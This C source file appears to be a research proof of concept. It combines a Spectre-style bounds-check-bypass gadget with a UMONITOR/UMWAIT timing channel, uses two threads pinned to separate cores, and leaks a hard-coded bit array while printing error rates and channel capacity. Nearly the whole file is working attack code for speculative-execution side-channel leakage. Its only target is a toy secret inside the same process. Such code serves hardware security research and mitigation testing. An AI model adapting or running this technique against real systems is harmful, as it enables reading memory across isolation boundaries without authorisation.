#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>

#include <fcntl.h>
#include <immintrin.h>
#include <math.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "cacheutils.h"

#define CORE_VICTIM 3
#define CORE_ATTACKER 2

#define OFFSET (4096)

// #define mytime(x) (rdtsc())
#define ftime time

void prepare()
{
  uint16_t value = 1;
  __asm__ volatile("mov %0, %%gs" : : "r"(value));
}

uint16_t check()
{
  uint16_t value;
  __asm__ volatile("mov %%gs, %0" : "=r"(value));
  return value;
}

unsigned long long reth1;
unsigned long long retl0;

unsigned long long mytime()
{
  __asm__ __volatile__(
      "rdtsc" : "=d"(reth1),
                "=a"(retl0));
  return ((reth1 << 32) | (retl0));
}
volatile int running = 1;

volatile unsigned int array1_size = 16;
uint8_t __attribute__((aligned(4096))) array1[160] = {
    2,
    2,
};
__attribute__((aligned(4096))) char test[4096 * 256];

volatile uint8_t temp = 0;

char secret[] = {0, 1, 1, 0, 0, 1, 0, 1};

void __attribute__((noinline)) victim_function(size_t x)
{
  if (x < array1_size)
  {
    temp &= test[array1[x] * 4096];
  }
}

void leakBit(size_t target_addr)
{
  int tries = 0, i, j, k, mix_i;
  size_t training_x, x;
  /* 16 loops: 5 training runs (x=training_x) per attack run (x=target_addr) */
  training_x = 0; // tries % array1_size;
  for (j = 17; j >= 0; j--)
  {
    flush((unsigned int *)&array1_size);
    asm volatile("mfence");

    x = ((j % 6) - 1) & ~0xFFFF;
    x = (x | (x >> 16));
    x = training_x ^ (x & (target_addr ^ training_x));

    asm volatile("mfence");

    victim_function(x);
  }
}

void pin_to_core(int core)
{
  cpu_set_t cpuset;
  pthread_t thread;

  thread = pthread_self();

  CPU_ZERO(&cpuset);
  CPU_SET(core, &cpuset);

  pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

volatile char waiting = 0;
volatile size_t cnt = 0, cnt_carry = 0, wait_write = 0, writes = 0;

volatile int lbit = 0;

void *leak_thread(void *dummy)
{
  pin_to_core(CORE_ATTACKER);
  test[OFFSET] = 1;
  size_t target_addr = (size_t)(secret - (char *)array1);

  while (1)
  {
    asm volatile("mfence");
    while (1)
    {
      while (wait_write)
        ;

      leakBit(target_addr + lbit);
      writes++;
      wait_write = 1;
      asm volatile("mfence");
    }
    asm volatile("mfence");
  }
}

double channel_capacity(size_t C, double p)
{
  return C *
         (1.0 + ((1.0 - p) * (log(1.0 - p) / log(2)) + p * (log(p) / log(2))));
}

int main(int argc, char *argv[])
{
  pthread_t p;
  pthread_create(&p, NULL, leak_thread, NULL);
  sched_yield();

  pin_to_core(CORE_VICTIM);

  memset(test, 1, sizeof(test));

  int bits_leaked = 0, bits_correct = 0, seg = 0, inter = 0, inter_err = 0;

  int timeout = -1;
  if (argc > 1)
    timeout = atoi(argv[1]);

  int start = ftime(NULL);
  while (start == ftime(NULL))
    ;
  start = ftime(NULL);
  int last_delta = 0;

  while (1)
  {
    prepare();
    for (int i = 0; i < 2; i++)
    {
      flush(&test[i * OFFSET]);
    }
    asm volatile("umonitor %%rax" : : "a"(test + OFFSET * 1), "c"(0), "d"(0));
    size_t carry = 0;
    wait_write = 0;
    asm volatile("xor %%rbx, %%rbx; umwait %%rcx; jnc 1f; inc %%rbx; 1: nop"
                 : "=b"(carry)
                 : "a"(-1), "d"(-1), "c"(0)
                 : "memory");
    cnt_carry += carry;
    cnt++;
    seg = check();
    while (!wait_write)
      ;

    if (cnt == 1)
    {
      if (seg == 0)
      {
        inter++;
      }
      if (seg == 0 & cnt_carry == secret[lbit])
      {
        inter_err++;
      }
      bits_leaked++;
      if (!cnt_carry == secret[lbit])
        bits_correct++;
      int current = ftime(NULL);
      int delta = current - start;
      if (!delta)
        delta = 1;

      if (delta != last_delta)
      {
        int speed = bits_leaked / delta;
        double err = ((double)(bits_leaked - bits_correct) / bits_leaked);
        double err2 = ((double)(bits_leaked - inter_err - bits_correct) / (bits_leaked - inter));
        printf(
            "%.3f%% error [%d leaked, %d s -> %d bits/s] - TC: %.1f bits/s\n",
            err * 100.0, bits_leaked, delta, speed,
            channel_capacity(speed, err));
        fflush(stdout);
        last_delta = delta;
        timeout--;
        if (timeout == 0)
        {
          printf("%.3f,%d,%.1f,irq=%d\n,after_filter:%.3f\n", err * 100.0, speed,
                 channel_capacity(speed, err), inter, err2 * 100);
          exit(0);
        }
      }
      cnt = 0;
      cnt_carry = 0;
      writes = 0;
      lbit = (lbit + 1) % (sizeof(secret) / sizeof(secret[0]));
    }
  }

  return 0;
}
